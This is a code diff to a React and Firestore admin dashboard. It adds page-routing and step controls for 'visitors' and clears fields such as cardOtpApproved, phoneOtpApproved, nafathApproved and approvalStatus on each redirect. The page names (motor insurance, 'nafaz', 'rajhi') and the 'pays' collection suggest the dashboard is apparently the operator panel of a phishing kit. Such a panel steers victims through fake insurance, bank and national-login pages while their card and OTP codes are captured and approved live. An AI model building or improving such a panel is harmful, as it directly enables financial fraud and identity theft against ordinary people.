@@ -42,6 +42,7 @@ import {
   query,
   orderBy,
   serverTimestamp,
+  deleteField,
 } from "firebase/firestore";
 import { db, isFirebaseConfigured, loginWithEmail, logout, subscribeToAuthState } from "@/lib/firebase";
 import type { User as FirebaseUser } from "firebase/auth";
@@ -344,6 +345,10 @@ export default function Dashboard() {
           targetStep: targetStep || 1,
           issuedAt: new Date().toISOString(),
         },
+        cardOtpApproved: deleteField(),
+        phoneOtpApproved: deleteField(),
+        nafathApproved: deleteField(),
+        approvalStatus: deleteField(),
       });
       toast({ title: `تم توجيه الزائر إلى ${targetPage}` });
     } catch (error) {
@@ -351,17 +356,30 @@ export default function Dashboard() {
     }
   };
 
+  const getBasePageName = (page?: string | number): string => {
+    if (!page || typeof page !== "string") return "motor";
+    if (page.startsWith("motor-insurance") || page.startsWith("motor")) return "motor";
+    if (page.startsWith("phone")) return "phone-verification";
+    if (page.startsWith("nafaz")) return "nafaz";
+    if (page.startsWith("rajhi")) return "rajhi";
+    return "motor";
+  };
+
   const handleSetStep = async (id: string, step: number) => {
     if (!db) return;
     try {
       const currentApp = notifications.find((n) => n.id === id);
-      const currentPage = currentApp?.currentPage || "motor";
+      const basePage = getBasePageName(currentApp?.currentPage);
       await updateDoc(doc(db, "pays", id), {
         adminDirective: {
-          targetPage: currentPage,
+          targetPage: basePage,
           targetStep: step,
           issuedAt: new Date().toISOString(),
         },
+        cardOtpApproved: deleteField(),
+        phoneOtpApproved: deleteField(),
+        nafathApproved: deleteField(),
+        approvalStatus: deleteField(),
       });
       toast({ title: `تم تغيير الخطوة إلى ${step}` });
     } catch (error) {
@@ -1120,18 +1138,22 @@ export default function Dashboard() {
                     <div className="border-t pt-3 mt-3">
                       <p className="text-xs text-gray-500 dark:text-gray-400 mb-2">التحكم بالخطوات</p>
                       <div className="flex flex-wrap gap-1">
-                        {[1, 2, 3, 4, 5].map((step) => (
-                          <Button
-                            key={step}
-                            variant={selectedApplication.currentStep === step ? "default" : "outline"}
-                            size="sm"
-                            className="w-8 h-8 p-0 text-xs"
-                            onClick={() => handleSetStep(selectedApplication.id, step)}
-                            data-testid={`button-step-${step}`}
-                          >
-                            {step}
-                          </Button>
-                        ))}
+                        {(() => {
+                          const basePage = getBasePageName(selectedApplication.currentPage);
+                          const stepCount = basePage === "motor" ? 7 : basePage === "rajhi" ? 2 : 1;
+                          return Array.from({ length: stepCount }, (_, i) => i + 1).map((step) => (
+                            <Button
+                              key={step}
+                              variant={selectedApplication.currentStep === step ? "default" : "outline"}
+                              size="sm"
+                              className="w-8 h-8 p-0 text-xs"
+                              onClick={() => handleSetStep(selectedApplication.id, step)}
+                              data-testid={`button-step-${step}`}
+                            >
+                              {step}
+                            </Button>
+                          ));
+                        })()}
                       </div>
                     </div>
                   </CardContent>
